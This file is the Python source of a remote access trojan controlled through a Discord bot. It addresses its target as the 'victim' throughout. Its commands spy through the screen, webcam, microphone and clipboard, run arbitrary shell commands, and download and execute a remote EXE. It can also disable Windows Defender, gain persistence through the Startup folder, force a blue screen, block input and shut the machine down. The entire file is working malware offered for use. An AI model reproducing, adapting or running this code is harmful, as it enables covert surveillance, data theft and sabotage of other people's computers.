import discord
from discord.ext import commands
from PIL import ImageGrab, ImageDraw
import io
import pyttsx3
import pyaudio
import wave
import subprocess
import asyncio
from threading import Thread
import pyautogui
import time
import ctypes
import aiohttp
import cv2
import psutil
import webbrowser
import os
import shutil
import pyperclip
import tempfile
import shelve
import sys

TOKEN = "BOT-TOKEN-GOES-HERE"

def BOT_KEY(n):
    BK=""
    for i in range(len(TOKEN) - 1, len(TOKEN) - n - 1, -1):
        BK = TOKEN[i] + BK
    return BK

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='$', intents=intents)
bot.remove_command('help')
pyautogui.FAILSAFE = False

config_path = os.path.join(os.path.expanduser("~"), 'AppData', 'Local', 'Microsoft', "config")
config_db = shelve.open(config_path, writeback=True)

@bot.command(help="Initiate configuration for the guild")
async def init(ctx):
    if ctx.author.guild_permissions.administrator:
        guild_id = str(ctx.guild.id)
        if ctx.message.content.endswith("/f"):
            del config_db[guild_id]
            await ctx.send("Previous configuration deleted.")
            config_db[guild_id] = {'allowed_roles': [], 'allowed_channels': []}
            await ctx.send("Configuration initialized for this guild.")
        elif guild_id in config_db:
            await ctx.send("A configuration already exists for this guild. "
                           "Run `$init /f` to force reinitialization.")
        else:
            config_db[guild_id] = {'allowed_roles': [], 'allowed_channels': []}
            await ctx.send("Configuration initialized for this guild.")
    else:
        await ctx.send("You don't have permission to initialize configuration for this guild.")

@bot.event
async def on_guild_join(guild):
    if str(guild.id) not in config_db:
        config_db[str(guild.id)] = {'allowed_roles': [], 'allowed_channels': []}
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                await channel.send(f"Bot has joined! Please run `$config` in a channel named `_jf_{ BOT_KEY(6)}` to get started.\nThe channel will be used to bypass role and channel allowlists, allowing for initial config.")


@bot.command(help=f"Configure allowed roles and channels for running commands, to run a command you must have the a allowed role and be in an allowed channel, running in _jf_{BOT_KEY(6)} bypasses both che cks")
async def config(ctx, action: str = "", item: str = "", target: str = ""):
    guild_id = str(ctx.guild.id)
    if action == "":
        await ctx.send(f"Please choose a config option: role, channel")
        return
    elif item == "":
        await ctx.send(f"Please choose a mode: add, remove, list")
        return
    elif target == "" and item != "list":
        await ctx.send(f"Please enter a target (role or channel name to add or remove from allow list)")
        return
    elif action == 'role':
        if item == 'add':
            role = discord.utils.get(ctx.guild.roles, name=target)
            if not role:
                await ctx.send("Role not found.")
                return
            role_id = role.id
            if role_id in config_db[guild_id]['allowed_roles']:
                await ctx.send("Role already exists in allowed roles.")
            else:
                config_db[guild_id]['allowed_roles'].append(role_id)
                await ctx.send(f"Role '{target}' added to allowed roles.")
        elif item == 'remove':
            role = discord.utils.get(ctx.guild.roles, name=target)
            if not role:
                await ctx.send("Role not found.")
                return
            role_id = role.id

            if role_id in config_db[guild_id]['allowed_roles']:
                config_db[guild_id]['allowed_roles'].remove(role_id)
                await ctx.send("Role removed from allowed roles.")
            else:
                await ctx.send("Role not found in allowed roles.")
        elif item == 'list':
            allowed_roles = [ctx.guild.get_role(role_id) for role_id in config_db[guild_id]['allowed_roles']]
            role_names = [role.name for role in allowed_roles if role]
            await ctx.send(f"Allowed roles: {', '.join(role_names)}")
        else:
            await ctx.send("Invalid action. Use 'add', 'remove', or 'list'.")
    elif action == 'channel':
        if item == 'add':
            channel = discord.utils.get(ctx.guild.channels, name=target)
            if channel:
                config_db[guild_id]['allowed_channels'].append(channel.id)
                await ctx.send(f"Channel '{channel.name}' added to allowed channels.")
            else:
                await ctx.send("Channel not found.")
        elif item == 'remove':
            channel = discord.utils.get(ctx.guild.channels, name=target)
            if not channel:
                await ctx.send("Channel not found.")
                return
            channel_id = channel.id

            if channel_id in config_db[guild_id]['allowed_channels']:
                config_db[guild_id]['allowed_channels'].remove(channel_id)
                await ctx.send("Channel removed from allowed channels.")
            else:
                await ctx.send("Channel not found in allowed channels.")
        elif item == 'list':
            allowed_channels = [ctx.guild.get_channel(channel_id) for channel_id in config_db[guild_id]['allowed_channels']]
            channel_names = [channel.name for channel in allowed_channels if channel]
            await ctx.send(f"Allowed channels: {', '.join(channel_names)}")
        else:
            await ctx.send("Invalid action. Use 'add', 'remove', or 'list'.")
    else:
        await ctx.send("Invalid action. Use 'role' or 'channel'.")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if isinstance(message.channel, discord.DMChannel):
        await message.reply("Commands cannot be run here.")
        return

    if message.content.startswith('_jf_'):
        bot_code = message.content.split('_')[-1]
        if bot_code != BOT_KEY(6):
            return

        await bot.process_commands(message)
        return

    if message.channel.name.startswith(f"_jf_{BOT_KEY(6)}"):
        await bot.process_commands(message)
        return

    guild_id = str(message.guild.id)
    if message.channel.id in config_db.get(guild_id, {}).get('allowed_channels', []):
        if any(role.id in config_db.get(guild_id, {}).get('allowed_roles', []) for role in message.author.roles):
            await bot.process_commands(message)
            return
  
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"channel _jf_{BOT_KEY(6)}"))
    print(f'We have logged in as {bot.user.name}')
    for guild in bot.guilds:
        for channel in guild.text_channels:
            await channel.send("Victim has logged on!")

    
@bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device.")
async def setpos(ctx, x: int, y: int):
    try:
        pyautogui.moveTo(x, y)
        await ctx.reply("Cursor position set successfully.")
    except Exception as e:
        await ctx.reply(f"Error setting cursor position: {str(e)}")

@bot.command(help="Simulate left mouse click on victim's device.")
async def lclick(ctx):
    try:
        pyautogui.click(button='left')
        await ctx.reply("Left click executed successfully.")
    except Exception as e:
        await ctx.reply(f"Error executing left click: {str(e)}")

@bot.command(help="Simulate middle mouse click on victim's device.")
async def mclick(ctx):
    try:
        pyautogui.click(button='middle')
        await ctx.reply("Middle click executed successfully.")
    except Exception as e:
        await ctx.reply(f"Error executing middle click: {str(e)}")

@bot.command(help="Simulate right mouse click on victim's device.")
async def rclick(ctx):
    try:
        pyautogui.click(button='right')
        await ctx.reply("Right click executed successfully.")
    except Exception as e:
        await ctx.reply(f"Error executing right click: {str(e)}")

@bot.command(help="Press a key/hotkey on victim's device.\nAvailable functions: press, keydown, keyup, hotkey (format button+button). Available keys: https://bit.ly/3ya6vKg")
async def key(ctx, func: str = "", value: str = ""):
    if not func:
        await ctx.reply("Function not provided. Available functions: press, keydown, keyup, hotkey.")
        return

    func = func.lower()
    
    if func not in ["press", "keydown", "keyup", "hotkey"]:
        await ctx.reply("Invalid function. Available functions: press, keydown, keyup, hotkey.")
        return

    if not value or value == "":
        await ctx.reply("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
        return
    
    try:
        if func == "press":
            pyautogui.press(value)
        elif func == "keydown":
            pyautogui.keyDown(value)
        elif func == "keyup":
            pyautogui.keyUp(value)
        elif func == "hotkey":
            keys = value.split("+")
            pyautogui.hotkey(*keys)
        
        await ctx.reply("Command executed successfully.")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")


@bot.command(help="Get victims clipboard.")
async def get_clipboard(ctx):
    try:
        await ctx.reply(f"Current clipboard: ```{pyperclip.paste()}```")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")
        
@bot.command(help="Copy given text to victims clipboard.")
async def set_clipboard(ctx, *, text: str):
    try:
        pyperclip.copy(text)
        await ctx.reply(f"Copied to clipboard")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")   

@bot.command(help="Takes a screenshot of the victim's screen including cursor location.")
async def ss(ctx):
    img = ImageGrab.grab()
    cursor_position = pyautogui.position()

    draw = ImageDraw.Draw(img)
    draw.ellipse((cursor_position[0]//2-5, cursor_position[1]//2-5, cursor_position[0]//2+5, cursor_position[1]//2+5), fill=(255, 0, 0))

    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
        img.save(temp_file, 'PNG')
        await ctx.reply("Command Executed! (Red dot indicates cursor)", file=discord.File(temp_file.name, filename="screenshot.png"))

tts_process = None

def tts_function(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

@bot.command(help="Converts the given text into speech on the victim's system.")
async def tts(ctx, *, text: str):
    global tts_process
    if tts_process and tts_process.poll() is None:
        await ctx.reply("Text-to-speech is already running. Use !stoptts to stop it.")
        return

    tts_process = subprocess.Popen(["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"])
    await ctx.reply("Command Executed!")

@bot.command(help="Stops TTS.")
async def stoptts(ctx):
    global tts_process
    if tts_process and tts_process.poll() is None:
        tts_process.terminate()
        tts_process.wait()
        await ctx.reply("TTS stopped.")
    else:
        await ctx.reply("TTS is not running.")

@bot.command(help="Records audio from the victim's microphone for 10 seconds.")
async def listen(ctx):
    def recording_thread():
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = 10

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        frames = []

        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        with io.BytesIO() as buf:
            wf = wave.open(buf, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

            buf.seek(0)
            bot.loop.call_soon_threadsafe(asyncio.create_task, send_response(ctx, buf))

    def send_response(ctx, buf):
        return ctx.reply("Command Executed!", file=discord.File(fp=buf, filename="output.wav"))

    thread = Thread(target=recording_thread)
    thread.start()

@bot.command(help="Runs the specified program on the victim's system.")
async def run(ctx, *, program: str):
    try:
        subprocess.Popen(program, shell=True)
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Types the given text on the victim's system.")
async def write(ctx, *, text: str):
    try:
        pyautogui.write(text)
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Presses the 'Enter' key on the victim's system.")
async def enter(ctx):
    try:
        pyautogui.press('enter')
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Freezes the cursor on the victim's system.")
async def freezecursor(ctx):
    try:
        result = ctypes.windll.user32.BlockInput(True)
        if result == 0:
            await ctx.reply("Failed to freeze cursor. Victim is not running with elevated privileges.")
        else:
            await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Unfreezes the cursor on the victim's system.")
async def unfreezecursor(ctx):
    try:
        ctypes.windll.user32.BlockInput(False)
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Downloads and executes a file from the provided URL on the victim's system.")
async def downloadANDrun(ctx, *, url: str):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status != 200:
                    return await ctx.reply("Failed to download the file.")
                
                with open("downloaded_file.exe", "wb") as file:
                    file.write(await response.read())
                
        subprocess.Popen("downloaded_file.exe", shell=True)
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Attempts to trigger a blue screen on the victim's system.")
async def bluescreen(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_long()))
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Takes a picture on the victim's webcam.")
async def webcampic(ctx, cam: int = 0):
    try:
        cap = cv2.VideoCapture(cam)
        if not cap.isOpened():
            raise Exception("Could not open webcam")
        
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            raise Exception("Failed to grab frame from webcam")
        
        with io.BytesIO() as buf:
            im_encoded = cv2.imencode(".png", frame)[1]
            buf.write(im_encoded.tobytes())
            buf.seek(0)
            await ctx.reply(f"Captured from camera {cam}!", file=discord.File(fp=buf, filename="webcam.png"))
            
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Lists all running tasks on the victim's system.")
async def tasks(ctx):
    processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
    
    with io.StringIO() as buf:
        for proc in processes:
            buf.write(f"PID: {proc['pid']} - Name: {proc['name']}\n")
        
        buf.seek(0)
        
        await ctx.reply("List of running tasks:", file=discord.File(fp=buf, filename="tasks.txt"))

@bot.command(help="Attempts to terminate a process on the victim's system using either its PID or name.")
async def kill(ctx, arg: str = ""):
    if arg == "" or not arg:
        await ctx.reply("Please enter a task to be terminated")
    try:
        pid = int(arg)
        process = psutil.Process(pid)
        process.terminate() 
        await ctx.reply(f"Task with PID {pid} has been terminated!")
    except ValueError:
        terminated = 0
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == arg:
                try:
                    psutil.Process(proc.info['pid']).terminate()
                    terminated += 1
                except psutil.NoSuchProcess:
                    pass
        if terminated > 0:
            await ctx.reply(f"Terminated {terminated} processes with the name {arg}.")
        else:
            await ctx.reply(f"No processes with the name {arg} found.")
    except Exception as e:
        await ctx.reply(f"Error terminating task: {str(e)}")

@bot.command(help="Opens the given website on the victim's default browser and maximizes it.")
async def website(ctx, *, url: str):
    try:
        webbrowser.open(url)
        
        time.sleep(3)

        pyautogui.hotkey('f11')
        
        await ctx.reply(f"Opened and maximized the website: {url}")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Shuts down the victim's system.")
async def shutdown(ctx):
    try:
        os.system('shutdown /s /t 1')
        await ctx.reply("Command Executed! System is shutting down.")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Restarts the victim's system.")
async def restart(ctx):
    try:
        os.system('shutdown /r /t 1')
        await ctx.reply("Command Executed! System is restarting.")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Logs off the current user on the victim's system.")
async def logoff(ctx):
    try:
        os.system('shutdown /l')
        await ctx.reply("Command Executed! Logging off.")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command()
async def help(ctx, command_name: str):
    command = bot.get_command(command_name)
    if command:
        embed = discord.Embed(
            title=f"Help: {command_name}",
            description=command.help if command.help else "No description provided",
            color=0x007BFF
        )
        await ctx.reply(embed=embed)
    else:
        await ctx.reply(f"Command '{command_name}' not found.")

per_page = 10

@bot.command()
async def commands(ctx, page: int = 1):
    commands_list = list(bot.commands)

    max_page = (len(commands_list) - 1) // per_page + 1

    if page < 1 or page > max_page:
        await ctx.reply(f"Page {page} is out of range. Please provide a page number between 1 and {max_page}.")
        return

    start_index = (page - 1) * per_page
    end_index = start_index + per_page
    commands_on_page = commands_list[start_index:end_index]

    embed = discord.Embed(
        title="Available Commands",
        description="List of all commands",
        color=0x007BFF
    )

    for command in commands_on_page:
        embed.add_field(
            name=command.name,
            value=command.help if command.help else "No description provided",
            inline=False
        )

    embed.set_footer(text=f"Page {page}/{max_page}")

    message = await ctx.reply(embed=embed)

    if max_page > 1:
        await message.add_reaction("◀️")
        await message.add_reaction("▶️")

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["◀️", "▶️"] and reaction.message.id == message.id

    while True:
        try:
            reaction, user = await bot.wait_for("reaction_add", timeout=60, check=check)
            await message.remove_reaction(reaction, user)
            
            if str(reaction.emoji) == "◀️" and page > 1:
                page -= 1
            elif str(reaction.emoji) == "▶️" and page < max_page:
                page += 1
            
            start_index = (page - 1) * per_page
            end_index = start_index + per_page
            commands_on_page = commands_list[start_index:end_index]

            embed.clear_fields()
            for command in commands_on_page:
                embed.add_field(
                    name=command.name,
                    value=command.help if command.help else "No description provided",
                    inline=False
                )
            
            embed.set_footer(text=f"Page {page}/{max_page}")

            await message.edit(embed=embed)

        except asyncio.TimeoutError:
            break

@bot.command(help="Disables Windows Defender on the victim's system.")
async def disabledefender(ctx):
    try:
        command = '''powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"'''
        os.system(command)
        await ctx.reply("Command Executed! Windows Defender's Real-Time Monitoring is now disabled.")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Makes this script execute on logon (only user that ran this file).")
async def startup(ctx):
    try:
        script_path = sys.executable
        startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', "Programs", "Startup")
    
        if os.path.exists(startup_folder):
            script_name = os.path.basename(script_path)
    
            destination_path = os.path.join(startup_folder, script_name)
    
            shutil.copy(script_path, destination_path)
    
            print(f"Script '{script_name}' moved to the startup folder.")
            await ctx.reply(f"Moved '{script_name}' to the startup folder.")
        else:
            await ctx.reply(f"Startup folder \"{startup_folder}\" not found.")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")
        
@bot.command(help="Force stops the bot.")
async def estop(ctx):
    await ctx.send("Force stopping bot...")
    await bot.close()
    os._exit(0)

bot.run(TOKEN)